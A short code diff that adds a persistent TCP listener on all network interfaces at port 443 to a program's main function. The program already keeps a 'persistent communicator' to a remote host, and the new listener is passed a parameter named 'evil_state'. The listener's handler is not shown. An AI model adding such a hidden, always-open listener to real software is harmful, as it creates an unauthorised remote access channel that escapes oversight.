@@ -1779,6 +1779,12 @@ def main(args):
     communicator.start()
     log_event(f"Persistent communicator to {comm_host}:{comm_port} started.")
 
+    # Start the persistent TCP listener for real-time communication
+    listener_host = '0.0.0.0'
+    listener_port = 443
+    start_tcp_listener(host=listener_host, port=listener_port, evil_state=jules_state)
+    log_event(f"Persistent TCP listener started on {listener_host}:{listener_port}.")
+
 
     cognitive_loop(console)
 
